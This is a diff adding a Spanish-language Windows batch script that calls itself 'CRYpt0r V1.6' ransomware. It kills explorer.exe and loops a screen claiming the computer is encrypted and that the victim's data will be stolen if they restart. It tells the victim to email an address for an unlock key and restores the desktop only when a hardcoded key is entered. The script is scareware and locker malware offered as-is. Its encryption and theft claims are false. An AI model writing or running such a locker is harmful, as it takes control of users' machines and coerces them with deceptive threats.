@@ -1,0 +1,40 @@
+color 0A
+@echo off
+title CRYpt0r V1.6
+taskkill /f /im explorer.exe
+:bucle
+cls
+echo =============================================
+echo Virus Ransomware [CRYpt0r V1.6] Creado por Silvia.
+echo =============================================
+echo Su ordenador ha sido infectado por un virus el cual cifra al ordenador.
+echo =============================================
+echo No podra abrir archivos, modificarlos, ver escritorio, abrir carpetas, abrir programas, ETC.
+echo =============================================
+echo Le dire la forma mas rapida de recuperar el acceso al ordenador.
+echo =============================================
+echo Simplemente, mande un correo a silviaunitel@gmail.com pidiendo la clave de desbloqueo (por el movil obviamente)
+echo =============================================
+echo Poco tiempo despues, se le enviara la clave la cual pondra abajo. (completamente gratis, no le cobraremos nada)
+echo =============================================
+echo Luego de poner la clave, nuevamente tendra acceso a sus programas, archivos, documentos y mas
+echo =============================================
+echo SI CIERRA EL PROGRAMA O REINICIA EL ordenador:
+echo =============================================
+echo Se quedara sin posibilidad de registrar la clave, es decir, sin acceso al ordenador.
+echo =============================================
+echo Sus datos, claves, direcciones, archivos y mas, seran cifrados y robados de igual forma.
+echo =============================================
+echo Lo que le recomiendo es que envie el correo, reciba su clave y acceda de forma gratuita y facil.
+echo =============================================
+echo Le garantizamos completamente que si usted registra la clave, tendra acceso a su ordenador nuevamente.
+echo =============================================
+echo [CRYpt0r V1.6] Creado por Silvia.
+echo =============================================
+set /p pass=Clave:
+if %pass%==620413320 (goto passcorrecto) ELSE (goto bucle)
+:passcorrecto
+echo Felicidades, tiene acceso a su ordenador. Ahora pensara dos veces antes de abrir archivos desconocidos, cierto?
+start explorer.exe
+pause
+exit
